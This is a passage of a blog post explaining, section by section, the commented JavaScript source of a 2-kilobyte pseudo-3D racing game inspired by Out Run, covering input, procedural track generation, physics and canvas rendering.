&lt;p&gt;This post is going to be a bit long because it contains the JavaScript code for my game in it’s entirety. The code is already well commented so I’m not going to explain every line of it nor are you expected to read through all the code now. Instead my goal is to explain how it works, why I made it this way, and walk you through the overall structure. &lt;a href=&quot;https://codepen.io/KilledByAPixel/pen/poJdLwB&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;This same code is on CodePen for you to play around with live.&lt;/a&gt; So please continue reading, buckle up, and hold onto your butts!&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-large&quot; src=&quot;https://i.imgur.com/XBQ8FZj.gif&quot; width=&quot;506&quot; height=&quot;253&quot;/&gt;&lt;/p&gt;

&lt;h2&gt;Inspiration&lt;/h2&gt;
&lt;div id=&quot;attachment_7492&quot; class=&quot;wp-caption alignright&quot;&gt;&lt;img aria-describedby=&quot;caption-attachment-7492&quot; class=&quot;wp-image-7492 size-full&quot; src=&quot;http://frankforce.com/wp-content/uploads/2020/03/OutRun.png&quot; alt=&quot;&quot; width=&quot;320&quot; height=&quot;224&quot; srcset=&quot;http://frankforce.com/wp-content/uploads/2020/03/OutRun.png 320w, http://frankforce.com/wp-content/uploads/2020/03/OutRun-300x210.png 300w&quot; sizes=&quot;(max-width: 320px) 100vw, 320px&quot;/&gt;&lt;p id=&quot;caption-attachment-7492&quot; class=&quot;wp-caption-text&quot;&gt;Out Run by Sega&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;My primary inspiration comes from nostalgia of classic 80’s style racing games like Out Run. Using a similar technique, they were able to push real time 3D graphics on very early hardware. Also I have recently been playing some modern racing games like &lt;a href=&quot;https://store.steampowered.com/app/233610/Distance/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Distance&lt;/a&gt; and &lt;a href=&quot;https://store.steampowered.com/app/711540/Lonely_Mountains_Downhill/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Lonely Mountains: Downhill&lt;/a&gt; which helped inform the visual design and feel.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/jakesgordon/javascript-racer/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Jake Gordon’s project to create a pseudo 3D racer in JavaScript&lt;/a&gt; was a big help. He wrote a fantastic multi post blog series that explains how it works. Though I started from scratch, seeing his code helped me work through some of the math and other problems I encountered.&lt;/p&gt;
&lt;p&gt;I also looked at a &lt;a href=&quot;https://js1k.com/2019-x/demo/4006&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;JS1k game called Moto1kross by Chris Glover&lt;/a&gt;. This simple one kilobyte racing game helped give me a point of reference for what was possible, and with an extra kilobyte of space available I knew I had to far surpass it.&lt;/p&gt;
&lt;h2&gt;High Level Strategy&lt;/h2&gt;
&lt;p&gt;Because of the strict size limitation, I needed to be very careful about how my program is structured. My general strategy was to keep everything as simple as possible in serving the ultimate goal of making a game that looks and feels solid.&lt;/p&gt;
&lt;p&gt;To help compress the code, I ran it through &lt;a href=&quot;https://closure-compiler.appspot.com/home&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Google Closure Compiler&lt;/a&gt; which removes all white space, renames variables to 1 letter characters, and preforms some light optimization. &lt;a href=&quot;https://closure-compiler.appspot.com/home&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;You can use this site to run your code through Closure Compiler Service online&lt;/a&gt;. Unfortunately Closure does some other stuff that doesn’t help, like replacing template strings, default parameters and other ES6 features that help save space. So I needed to manually undo some of that and preform a few more ‘risky’ minification techniques to squeeze out every last byte. It’s not a huge win though, the bulk of the savings comes from the structure of the code itself.&lt;/p&gt;
&lt;p&gt;The code needs to be zipped to fit into a 2 kilobytes. If that was not an option there is &lt;a href=&quot;https://siorki.github.io/regPack.html&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;a similar yet less powerful tool called RegPack which can make self uncompromising JavaScript&lt;/a&gt;. Either way the strategy is the same, to repeat code wherever possible and let the compressor deflate it. For example there are certain strings which appear often so their compression ratio is large. Some of the best examples are c.width, c.height, and Math, but there are many other smaller ones that add up. So, when reading through this code, keep in mind that you will often see things purposefully repeated to take advantage of the compression.&lt;/p&gt;
&lt;h2&gt;CodePen&lt;/h2&gt;
&lt;p&gt;Here’s the game running live on CodePen. You can actually play it in the iframe, but for best results I recommend &lt;a href=&quot;https://codepen.io/KilledByAPixel/pen/poJdLwB&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;opening it in a new tab, where you can edit or fork the code.&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;HTML&lt;/h2&gt;
&lt;p&gt;There is very little html used by my game, as it is mostly JavaScript. This is the smallest way to create a full screen canvas, combined with code that later sets the canvas size to the window inner size. I’m not sure why on CodePen it was necessary to add overflow:hidden to the body, but this should work fine when opened directly.&lt;/p&gt;
&lt;p&gt;The final minified version uses an even smaller setup by wrapping the JavaScript in an onload call… &amp;lt;body style=margin:0 onload=”code_goes_here”&amp;gt;&amp;lt;canvas id=c&amp;gt; However, during development I prefer not to use that condensed setup because the code is stored in a string so editors can’t properly highlight the syntax.&lt;/p&gt;
&lt;pre&gt;
&amp;lt;body style=margin:0&amp;gt;
&amp;lt;canvas id=c&amp;gt;
&amp;lt;script&amp;gt;
&lt;/pre&gt;
&lt;h2&gt;Constants&lt;/h2&gt;
&lt;p&gt;There are many constants that control different aspects of the game. When the code is minified with a tool like &lt;a href=&quot;https://developers.google.com/closure/compiler&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Google Closure&lt;/a&gt;, these constants will all be replaced much like a #define in C++. Putting them first makes it faster to tweak gameplay.&lt;/p&gt;
&lt;pre&gt;
// draw settings
const context = c.getContext`2d`; // canvas context
const drawDistance = 800;         // how far ahead to draw
const cameraDepth = 1;            // FOV of camera
const segmentLength = 100;        // length of each road segment
const roadWidth = 500;            // how wide is road
const curbWidth = 150;            // with of warning track
const dashLineWidth = 9;          // width of the dashed line
const maxPlayerX = 2e3;           // limit player offset
const mountainCount = 30;         // how many mountains are there
const timeDelta = 1/60;           // inverse frame rate
const PI = Math.PI;               // shorthand for Math.PI

// player settings
const height = 150;               // high of player above ground
const maxSpeed = 300;             // limit max player speed
const playerAccel = 1;            // player forward acceleration
const playerBrake = -3;           // player breaking acceleration
const turnControl = .2;           // player turning rate
const jumpAccel = 25;             // z speed added for jump
const springConstant = .01;       // spring players pitch
const collisionSlow = .1;         // slow down from collisions
const pitchLerp = .1;             // rate camera pitch changes
const pitchSpringDamp = .9;       // dampen the pitch spring
const elasticity = 1.2;           // bounce elasticity
const centrifugal = .002;         // how much turns pull player
const forwardDamp = .999;         // dampen player z speed
const lateralDamp = .7;           // dampen player x speed
const offRoadDamp = .98;          // more damping when off road
const gravity = -1;               // gravity to apply in y axis
const cameraTurnScale = 2;        // how much to rotate camera
const worldRotateScale = .00005;  // how much to rotate world
    
// level settings
const maxTime = 20;               // time to start
const checkPointTime = 10;        // add time at checkpoints
const checkPointDistance = 1e5;   // how far between checkpoints
const maxDifficultySegment = 9e3; // how far until max difficulty
const roadEnd = 1e4;              // how far until end of road
&lt;/pre&gt;
&lt;h2&gt;Mouse Control&lt;/h2&gt;
&lt;p&gt;The input system is very simple, using only the mouse. With this bit of code we can track mouse clicks and the horizontal cursor position expressed as a value between -1 and 1. Double clicking is implemented via mouseUpFrames. The mousePressed variable is only used once, to start the game when the player clicks for the first time.&lt;/p&gt;
&lt;pre&gt;
mouseDown     =
mousePressed  =
mouseUpFrames =
mouseX        = 0;
    
onmouseup   =e=&amp;gt; mouseDown = 0;
onmousedown =e=&amp;gt; mousePressed ? mouseDown = 1 : mousePressed = 1;
onmousemove =e=&amp;gt; mouseX = e.x/window.innerWidth*2 - 1;
&lt;/pre&gt;
&lt;h2&gt;Math Functions&lt;/h2&gt;
&lt;p&gt;There are a few functions used by this game to simplify code and reduce repetition. Some standard math functions to Clamp and Lerp values. ClampAngle is useful because it wraps angles between -PI and PI, something many games require.&lt;/p&gt;
&lt;div id=&quot;attachment_7456&quot; class=&quot;wp-caption alignright&quot;&gt;&lt;img aria-describedby=&quot;caption-attachment-7456&quot; class=&quot;wp-image-7456 size-full&quot; src=&quot;http://frankforce.com/wp-content/uploads/2020/03/rand-4.png&quot; alt=&quot;&quot; width=&quot;150&quot; height=&quot;150&quot;/&gt;&lt;p id=&quot;caption-attachment-7456&quot; class=&quot;wp-caption-text&quot;&gt;Random Test Pattern&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;The R function works almost like magic because it generates seeded random numbers. This is done by taking the sine of the current random seed, multiplying it by a high number, and then looking at the fractional part. There are many ways to do it but this is one of the smallest. I wouldn’t recommend using this for gambling software but it’s random enough for our purposes. We will be using this random generator to create variety procedurally without needing to save any data. For example the variation in mountains, rocks and trees is not stored anywhere in memory. The goal isn’t to reduce memory in this case though, but to eliminate the code that would be needed to store and retrieve that data.&lt;/p&gt;
&lt;p&gt;As this is a “True 3D” game it helps greatly to have a 3D vector class which also makes the code smaller. This class contains only the bare essentials necessary for this game, a constructor with add and multiply functions can take either scalar or vector parameter. To determine if a scalar is passed in, we just check if it is less then a large number. A more correct way would be to use isNan or check if it’s type is a Vec3, but that would require more space.&lt;/p&gt;
&lt;pre&gt;
Clamp     =(v, a, b)  =&amp;gt; Math.min(Math.max(v, a), b);
ClampAngle=(a)        =&amp;gt; (a+PI) % (2*PI) + (a+PI&amp;lt;0? PI : -PI);
Lerp      =(p, a, b)  =&amp;gt; a + Clamp(p, 0, 1) * (b-a);
R         =(a=1, b=0) =&amp;gt; Lerp((Math.sin(++randSeed)+1)*1e5%1,a,b);
   
class Vec3 // simple 3d vector class
{
  constructor(x=0, y=0, z=0) {this.x = x; this.y = y; this.z = z;}
  
  Add=(v)=&amp;gt;(
    v = v &amp;lt; 1e5 ? new Vec3(v,v,v) : v, 
    new Vec3( this.x + v.x, this.y + v.y, this.z + v.z ));
    
  Multiply=(v)=&amp;gt;(
    v = v &amp;lt; 1e5 ? new Vec3(v,v,v) : v, 
    new Vec3( this.x * v.x, this.y * v.y, this.z * v.z ));
}
&lt;/pre&gt;
&lt;h2&gt;Render Functions&lt;/h2&gt;
&lt;p&gt;LSHA generates a standard HSLA (hue, saturation, luminosity, alpha) color using a template string, and has just been reordered so more often used components come first. The global hue shift that occurs at checkpoints is also applied here.&lt;/p&gt;
&lt;p&gt;DrawPoly draws a trapezoid shape and is used to render absolutely everything in the scene. The Y component is converted to an integer using |0 to ensure that the road polys are fully connected. Without this, there would be a thin line between road segments. For this same reason this rendering tech can’t handle applying roll to the camera without causing graphical artifacts from diagonal lines.&lt;/p&gt;
&lt;p&gt;DrawText just renders outlined text used to display time, distance, and the game’s title.&lt;/p&gt;
&lt;pre&gt;
LSHA=(l,s=0,h=0,a=1)=&amp;gt;`hsl(${h+hueShift},${s}%,${l}%,${a})`;

// draw a trapazoid shaped poly
DrawPoly=(x1, y1, w1, x2, y2, w2, fillStyle)=&amp;gt;
{
    context.beginPath(context.fillStyle = fillStyle);
    context.lineTo(x1-w1, y1|0);
    context.lineTo(x1+w1, y1|0);
    context.lineTo(x2+w2, y2|0);
    context.lineTo(x2-w2, y2|0);
    context.fill();
}

// draw outlined hud text
DrawText=(text, posX)=&amp;gt;
{
    context.font = '9em impact';         // set font size
    context.fillStyle = LSHA(99,0,0,.5); // set font color
    context.fillText(text, posX, 129);   // fill text
    context.lineWidth = 3;               // line width
    context.strokeText(text, posX, 129); // outline text
}
&lt;/pre&gt;
&lt;h2&gt;Build Track with Procedural Generation&lt;/h2&gt;
&lt;p&gt;Before the game starts we must first generate the entire track which is will be different for every play through. To do this we build a list of road segments that store the position and width of the road at each point along the track.&lt;/p&gt;
&lt;p&gt;The track generator is pretty basic, it just tapers between sections of varying frequency, amplitude, and width. The distance along the track determines how difficult that section can be.&lt;/p&gt;
&lt;p&gt;The road pitch angle is calculated here using the atan2 function to be used for physics and lighting.&lt;/p&gt;
&lt;div id=&quot;attachment_7466&quot; class=&quot;wp-caption alignnone&quot;&gt;&lt;img aria-describedby=&quot;caption-attachment-7466&quot; class=&quot;wp-image-7466 size-full&quot; src=&quot;http://frankforce.com/wp-content/uploads/2020/03/track.png&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;161&quot; srcset=&quot;http://frankforce.com/wp-content/uploads/2020/03/track.png 600w, http://frankforce.com/wp-content/uploads/2020/03/track-300x81.png 300w&quot; sizes=&quot;(max-width: 600px) 100vw, 600px&quot;/&gt;&lt;p id=&quot;caption-attachment-7466&quot; class=&quot;wp-caption-text&quot;&gt;Example result of the procedural track generator.&lt;/p&gt;
&lt;/div&gt;
&lt;pre&gt;
roadGenLengthMax =                     // end of section
roadGenLength =                        // distance left
roadGenTaper =                         // length of taper
roadGenFreqX =                         // X wave frequency 
roadGenFreqY =                         // Y wave frequency
roadGenScaleX =                        // X wave amplitude
roadGenScaleY = 0;                     // Y wave amplitude
roadGenWidth = roadWidth;              // starting road width
startRandSeed = randSeed = Date.now(); // set random seed
road = [];                             // clear road

// generate the road
for( i = 0; i &amp;lt; roadEnd*2; ++i )          // build road past end
{
  if (roadGenLength++ &amp;gt; roadGenLengthMax) // is end of section?
  {
    // calculate difficulty percent
    d = Math.min(1, i/maxDifficultySegment);
  
    // randomize road settings
    roadGenWidth = roadWidth*R(1-d*.7,3-2*d);        // road width
    roadGenFreqX = R(Lerp(d,.01,.02));               // X curves
    roadGenFreqY = R(Lerp(d,.01,.03));               // Y bumps
    roadGenScaleX = i&amp;gt;roadEnd ? 0 : R(Lerp(d,.2,.6));// X scale
    roadGenScaleY = R(Lerp(d,1e3,2e3));              // Y scale
  
    // apply taper and move back
    roadGenTaper = R(99, 1e3)|0;                 // random taper
    roadGenLengthMax = roadGenTaper + R(99,1e3); // random length
    roadGenLength = 0;                           // reset length
    i -= roadGenTaper;                           // subtract taper
  }
  
  // make a wavy road
  x = Math.sin(i*roadGenFreqX) * roadGenScaleX;
  y = Math.sin(i*roadGenFreqY) * roadGenScaleY;
  road[i] = road[i]? road[i] : {x:x, y:y, w:roadGenWidth};
  
  // apply taper from last section and lerp values
  p = Clamp(roadGenLength / roadGenTaper, 0, 1);
  road[i].x = Lerp(p, road[i].x, x);
  road[i].y = Lerp(p, road[i].y, y);
  road[i].w = i &amp;gt; roadEnd ? 0 : Lerp(p, road[i].w, roadGenWidth);
    
  // calculate road pitch angle
  road[i].a = road[i-1] ? 
    Math.atan2(road[i-1].y-road[i].y, segmentLength) : 0;
}
&lt;/pre&gt;
&lt;h2&gt;Startup the Game&lt;/h2&gt;
&lt;p&gt;Now the the track exists, the rest of the startup is very simple. We need only initialize a few variables.&lt;/p&gt;
&lt;pre&gt;
// reset everything
velocity = new Vec3
  ( pitchSpring =  pitchSpringSpeed =  pitchRoad = hueShift = 0 );
  
position = new Vec3(0, height);      // set player start pos
nextCheckPoint = checkPointDistance; // init next checkpoint
time = maxTime;                      // set the start time
heading = randSeed;                  // random world heading
&lt;/pre&gt;
&lt;h2&gt;Update Player&lt;/h2&gt;
&lt;p&gt;This is the main update function that handles updating and rendering everything in the game! Normally it is not good practice to have a giant function in your code and this would be split up into sub functions. So to help explain things, it is broken up into several parts below.&lt;/p&gt;
&lt;p&gt;First we need to get some info about the road at the player’s location. To make the physics  and rendering feel smooth, the values are interpolated between current and next road segments.&lt;/p&gt;
&lt;p&gt;The player’s position and velocity are 3D vectors, and are updated with kinematics to apply gravity, dampening and other factors. If the player is below the road, the position is clamped to the ground plane and velocity is reflected against the normal. Also, while on ground the acceleration is applied and the camera will shake when off road. After play testing I decided to allow the player to still tun while airborne.&lt;/p&gt;
&lt;p&gt;Input is handled here to control acceleration, braking, jumping, and turning. Double clicks are detected is via mouseUpFrames. There is also some code to track how many frames the player has been in the air to allow a short grace period when the player can still jump.&lt;/p&gt;
&lt;p&gt;The camera’s pitch angle uses a simple spring system to give a dynamic feel as the player accelerates, brakes, and jumps. Also the camera tilts to match the road angle as the player drives over hills and jumps.&lt;/p&gt;
&lt;pre&gt;
Update=()=&amp;gt;
{

// get player road segment
s = position.z / segmentLength | 0; // current road segment
p = position.z / segmentLength % 1; // percent along segment

// get lerped values between last and current road segment
roadX = Lerp(p, road[s].x, road[s+1].x);
roadY = Lerp(p, road[s].y, road[s+1].y) + height;
roadA = Lerp(p, road[s].a, road[s+1].a);

// update player velocity
lastVelocity = velocity.Add(0);
velocity.y += gravity;
velocity.x *= lateralDamp;
velocity.z = Math.max(0, time?forwardDamp*velocity.z:0);

// add velocity to position
position = position.Add(velocity);
  
// limit player x position (how far off road)
position.x = Clamp(position.x, -maxPlayerX, maxPlayerX); 

// check if on ground
if (position.y &amp;lt; roadY)
{
  position.y = roadY; // match y to ground plane
  airFrame = 0;       // reset air frames
  
  // get the dot product of the ground normal and the velocity
  dp = Math.cos(roadA)*velocity.y + Math.sin(roadA)*velocity.z;
  
  // bounce velocity against ground normal
  velocity = new Vec3(0, Math.cos(roadA), Math.sin(roadA))
    .Multiply(-elasticity * dp).Add(velocity);
    
  // apply player brake and accel
  velocity.z += 
    mouseDown? playerBrake :
    Lerp(velocity.z/maxSpeed, mousePressed*playerAccel, 0);
  
  // check if off road
  if (Math.abs(position.x) &amp;gt; road[s].w)
  {
    velocity.z *= offRoadDamp;                    // slow down
    pitchSpring += Math.sin(position.z/99)**4/99; // rumble
  }
}

// update player turning and apply centrifugal force
turn = Lerp(velocity.z/maxSpeed, mouseX * turnControl, 0);
velocity.x +=
  velocity.z * turn -
  velocity.z ** 2 * centrifugal * roadX;

// update jump
if (airFrame++&amp;lt;6 &amp;amp;&amp;amp; time 
  &amp;amp;&amp;amp; mouseDown &amp;amp;&amp;amp; mouseUpFrames &amp;amp;&amp;amp; mouseUpFrames&amp;lt;9)
{
  velocity.y += jumpAccel; // apply jump velocity
  airFrame = 9;            // prevent jumping again
}
mouseUpFrames = mouseDown? 0 : mouseUpFrames+1;

// pitch down with vertical velocity when in air
airPercent = (position.y-roadY) / 99;
pitchSpringSpeed += Lerp(airPercent, 0, velocity.y/4e4);

// update player pitch spring
pitchSpringSpeed += (velocity.z - lastVelocity.z)/2e3;
pitchSpringSpeed -= pitchSpring * springConstant;
pitchSpringSpeed *= pitchSpringDamp;
pitchSpring += pitchSpringSpeed; 
pitchRoad = Lerp(pitchLerp, pitchRoad, Lerp(airPercent,-roadA,0));
playerPitch = pitchSpring + pitchRoad;

// update heading
heading = ClampAngle(heading + velocity.z*roadX*worldRotateScale);
cameraHeading = turn * cameraTurnScale;

// was checkpoint crossed?
if (position.z &amp;gt; nextCheckPoint)
{
  time += checkPointTime;               // add more time
  nextCheckPoint += checkPointDistance; // set next checkpoint
  hueShift += 36;                       // shift hue
}
&lt;/pre&gt;
&lt;h2&gt;Pre-Render&lt;/h2&gt;
&lt;p&gt;Before rendering, the canvas is cleared by setting it’s width and height. This also fits the canvas to fill the window.&lt;/p&gt;
&lt;p&gt;We also calculate the projection scale used to transform world points to canvas space. The cameraDepth value represents the field of view (FOV) of the camera which is to 90 degrees for this game. The calculation is 1/Math.tan((fovRadians/2), which works out to be exactly 1 for an FOV of 90 degrees. To preserve aspect ratio, the projection is scaled by c.width.&lt;/p&gt;
&lt;pre&gt;
// clear the screen and set size
c.width = window.innerWidth, c.height = window.innerHeight;

// calculate projection scale, flip y
projectScale = (new Vec3(1,-1,1)).Multiply(c.width/2/cameraDepth);
&lt;/pre&gt;
&lt;h2&gt;Draw Sky, Sun and Moon&lt;/h2&gt;
&lt;p&gt;&lt;img class=&quot;alignright wp-image-7458 size-medium&quot; src=&quot;http://frankforce.com/wp-content/uploads/2020/03/sky-300x165.jpg&quot; alt=&quot;&quot; width=&quot;300&quot; height=&quot;165&quot; srcset=&quot;http://frankforce.com/wp-content/uploads/2020/03/sky-300x165.jpg 300w, http://frankforce.com/wp-content/uploads/2020/03/sky.jpg 576w&quot; sizes=&quot;(max-width: 300px) 100vw, 300px&quot;/&gt;The background atmosphere is drawn with a full screen linear gradient that changes color based on the sun’s direction.&lt;/p&gt;
&lt;p&gt;To conserve space, both the sun and moon are drawn in the same for loop using a full screen radial gradient with transparency.&lt;/p&gt;
&lt;p&gt;The linear and radial gradients combine to make a sky box that fully wraps around the scene.&lt;/p&gt;
&lt;pre&gt;
// get horizon, offset, and light amount
horizon = c.height/2 - Math.tan(playerPitch)*projectScale.y;
backgroundOffset = Math.sin(cameraHeading)/2;
light = Math.cos(heading);

// create linear gradient for sky
g = context.createLinearGradient(0,horizon-c.height/2,0,horizon);
g.addColorStop(0,LSHA(39+light*25,49+light*19,230-light*19));
g.addColorStop(1,LSHA(5,79,250-light*9));

// draw sky as full screen poly
DrawPoly(c.width/2,0,c.width/2,c.width/2,c.height,c.width/2,g);

// draw sun and moon (0=sun, 1=moon)
for( i = 2 ; i--; )
{
  // create radial gradient
  g = context.createRadialGradient(
    x = c.width*(.5+Lerp(
      (heading/PI/2+.5+i/2)%1,
      4, -4)-backgroundOffset),
    y = horizon - c.width/5,
    c.width/25,
    x, y, i?c.width/23:c.width);
  g.addColorStop(0, LSHA(i?70:99));
  g.addColorStop(1, LSHA(0,0,0,0));
  
  // draw full screen poly
  DrawPoly(c.width/2,0,c.width/2,c.width/2,c.height,c.width/2,g);
}
&lt;/pre&gt;
&lt;h2&gt;Draw Mountains and Horizon&lt;/h2&gt;
&lt;p&gt;The mountains are procedurally generated, by drawing 50 triangles on the horizon. Lighting is applied so that mountains are darker when facing towards the sun because they are in shadow. Also, closer mountains are darker to simulate fog. The real trick here was tweaking the random values for the size and color to give good results.&lt;/p&gt;
&lt;p&gt;The final part of drawing the background is to draw the horizon line and below to fill the bottom of the canvas with solid green.&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-large wp-image-7461&quot; src=&quot;http://frankforce.com/wp-content/uploads/2020/03/mount2-1024x297.jpg&quot; alt=&quot;&quot; width=&quot;640&quot; height=&quot;186&quot; srcset=&quot;http://frankforce.com/wp-content/uploads/2020/03/mount2-1024x297.jpg 1024w, http://frankforce.com/wp-content/uploads/2020/03/mount2-300x87.jpg 300w, http://frankforce.com/wp-content/uploads/2020/03/mount2-768x222.jpg 768w, http://frankforce.com/wp-content/uploads/2020/03/mount2-1536x445.jpg 1536w, http://frankforce.com/wp-content/uploads/2020/03/mount2.jpg 1920w&quot; sizes=&quot;(max-width: 640px) 100vw, 640px&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
// set random seed for mountains
randSeed = startRandSeed;

// draw mountains
for( i = mountainCount; i--; )
{
  angle = ClampAngle(heading+R(19));
  light = Math.cos(angle-heading); 
  DrawPoly(
    x = c.width*(.5+Lerp(angle/PI/2+.5,4,-4)-backgroundOffset),
    y = horizon,
    w = R(.2,.8)**2*c.width/2,
    x + w*R(-.5,.5),
    y - R(.5,.8)*w, 0,
    LSHA(R(15,25)+i/3-light*9, i/2+R(19), R(220,230)));
}

// draw horizon
DrawPoly(
  c.width/2, horizon, c.width/2, c.width/2, c.height, c.width/2,
  LSHA(25, 30, 95));
&lt;/pre&gt;
&lt;h2&gt;Project Road Segments to Canvas Space&lt;/h2&gt;
&lt;p&gt;Before the road can be rendered, we must first get the projected road points. The first part of this is a bit tricky because our road’s x value needs to be converted to a world space position. To make the roads appear to curve, we will apply the x value as a second order derivative. This is why there is the strange bit of code “x+=w+=”. Because of the way this works, the road segments don’t have persistent world space positions, but instead are recomputed every frame based on the player’s location.&lt;/p&gt;
&lt;p&gt;Once we have the world space position, we can subtract the player position from the road position to get the local camera space position. The rest of the code applies a transform by first rotating heading, pitch, then the projection transform to make farther things appear smaller, and finally moving it to canvas space.&lt;/p&gt;
&lt;pre&gt;
for( x = w = i = 0; i &amp;lt; drawDistance+1; )
{
  p = new Vec3(x+=w+=road[s+i].x,     // sum local road offsets
    road[s+i].y, (s+i)*segmentLength) // road y and z pos
      .Add(position.Multiply(-1));    // get local camera space

  // apply camera heading
  p.x = p.x*Math.cos(cameraHeading) - p.z*Math.sin(cameraHeading);
  
  // tilt camera pitch and invert z
  z = 1/(p.z*Math.cos(playerPitch) - p.y*Math.sin(playerPitch));
  p.y = p.y*Math.cos(playerPitch) - p.z*Math.sin(playerPitch);
  p.z = z;
  
  // project road segment to canvas space
  road[s+i++].p =                         // projected road point
    p.Multiply(new Vec3(z, z, 1))         // projection
    .Multiply(projectScale)               // scale
    .Add(new Vec3(c.width/2,c.height/2)); // center on canvas
}
&lt;/pre&gt;
&lt;h2&gt;Draw Road Segments&lt;/h2&gt;
&lt;p&gt;Now that we have the canvas space points for each road segment, the rendering is fairly simple. We need to draw each of the road segments from back to front, or more specifically the trapezoid shaped polys that connect road segments.&lt;/p&gt;
&lt;p&gt;To create the road there are 4 layers rendered on top of each other: the ground, the striped curb, the road itself and the dashed white line. Each is shaded based on the pitch and heading of the road segment with some extra logic depending on that layer’s appearance.&lt;/p&gt;
&lt;p&gt;It is necessary to check if the segment is in the near / far clip range to prevent weird rendering artifacts. Also, there is a nice optimization to scale down the resolution of the road by distance when they become very thin. This cuts the draw count by over half with no noticeable loss in quality for a massive performance win.&lt;/p&gt;
&lt;div id=&quot;attachment_7498&quot; class=&quot;wp-caption aligncenter&quot;&gt;&lt;img aria-describedby=&quot;caption-attachment-7498&quot; class=&quot;wp-image-7498 size-full&quot; src=&quot;http://frankforce.com/wp-content/uploads/2020/03/road_outline.png&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;444&quot; srcset=&quot;http://frankforce.com/wp-content/uploads/2020/03/road_outline.png 600w, http://frankforce.com/wp-content/uploads/2020/03/road_outline-300x222.png 300w&quot; sizes=&quot;(max-width: 600px) 100vw, 600px&quot;/&gt;&lt;p id=&quot;caption-attachment-7498&quot; class=&quot;wp-caption-text&quot;&gt;Wireframe outline showing every poly that is rendered.&lt;/p&gt;
&lt;/div&gt;
&lt;pre&gt;
let segment2 = road[s+drawDistance]; // store the last segment
for( i = drawDistance; i--; )        // iterate in reverse
{
  // get projected road points
  segment1 = road[s+i];
  p1 = segment1.p;
  p2 = segment2.p;
  
  // random seed and lighting
  randSeed = startRandSeed + s + i;
  light = Math.sin(segment1.a) * Math.cos(heading) * 99;
  
  // check near and far clip
  if (p1.z &amp;lt; 1e5 &amp;amp;&amp;amp; p1.z &amp;gt; 0)
  {
    // fade in road resolution over distance
    if (i % (Lerp(i/drawDistance,1,9)|0) == 0)
    {
      // ground
      DrawPoly(c.width/2, p1.y, c.width/2,
        c.width/2, p2.y, c.width/2,
        LSHA(25 + light, 30, 95));

      // curb if wide enough
      if (segment1.w &amp;gt; 400)
        DrawPoly(p1.x, p1.y, p1.z*(segment1.w+curbWidth),
          p2.x, p2.y, p2.z*(segment2.w+curbWidth),
          LSHA(((s+i)%19&amp;lt;9? 50: 20) + light));
      
      // road and checkpoint marker
      DrawPoly(p1.x, p1.y, p1.z*segment1.w,
        p2.x, p2.y, p2.z*segment2.w,
        LSHA(((s+i)*segmentLength%checkPointDistance &amp;lt; 300 ?
          70 : 7) + light));
        
      // dashed lines if wide and close enough
      if ((segment1.w &amp;gt; 300) &amp;amp;&amp;amp; (s+i)%9==0 &amp;amp;&amp;amp; i &amp;lt; drawDistance/3)
          DrawPoly(p1.x, p1.y, p1.z*dashLineWidth,
          p2.x, p2.y, p2.z*dashLineWidth,
          LSHA(70 + light));

      // save this segment
      segment2 = segment1;
    }
&lt;/pre&gt;
&lt;h2&gt;Draw Road Trees and Rocks&lt;/h2&gt;
&lt;p&gt;This game has only two different types of objects: trees and rocks, which are rendered on top of the road. First we determine if there is an object by using the R() function. This is one of those places where the magic of the seeded random numbers shines. We will also use R() to add random shape and color variation to the objects.&lt;/p&gt;
&lt;p&gt;Originally I wanted to have other vehicles, but that would not fit in the size constraints without making major cuts so I comprised by using the scenery as obstacles. The positions is randomized and biased to be closer to the road, I found them too sparse and easy to navigate otherwise. To save space, the object height also determines the type of object.&lt;/p&gt;
&lt;p&gt;This is where collisions are checked between the player and objects by comparing their position in 3D space. When an object is hit, the player is slowed down and that object is marked as hit so it can be passed through safely.&lt;/p&gt;
&lt;p&gt;To prevent objects popping on the horizon, the transparency fades in over distance. The shape and color of the objects uses our trapezoid drawing function with variation thanks to the magical seeded random function I mentioned earlier.&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;size-full wp-image-7518 alignnone&quot; src=&quot;http://frankforce.com/wp-content/uploads/2020/03/objs.png&quot; alt=&quot;&quot; width=&quot;600&quot; height=&quot;187&quot; srcset=&quot;http://frankforce.com/wp-content/uploads/2020/03/objs.png 600w, http://frankforce.com/wp-content/uploads/2020/03/objs-300x94.png 300w&quot; sizes=&quot;(max-width: 600px) 100vw, 600px&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
    if (R()&amp;lt;.2 &amp;amp;&amp;amp; s+i&amp;gt;9)                   // is there an object?
    {
      // player object collision check
      x = 2*roadWidth * R(10,-10) * R(9);  // choose object pos
      const objectHeight = (R(2)|0) * 400; // choose tree or rock
      if (!segment1.h                      // dont hit same object
        &amp;amp;&amp;amp; Math.abs(position.x-x)&amp;lt;200                      // X
        &amp;amp;&amp;amp; Math.abs(position.z-(s+i)*segmentLength)&amp;lt;200    // Z
        &amp;amp;&amp;amp; position.y-height&amp;lt;segment1.y+objectHeight+200)  // Y
      {
        // slow player and mark object as hit
        velocity = velocity.Multiply(segment1.h = collisionSlow);
      }

      // draw road object
      const alpha = Lerp(i/drawDistance, 4, 0);  // fade in object
      if (objectHeight) 
      {
        // tree trunk
        DrawPoly(x = p1.x+p1.z * x, p1.y, p1.z*29,
          x, p1.y-99*p1.z, p1.z*29,
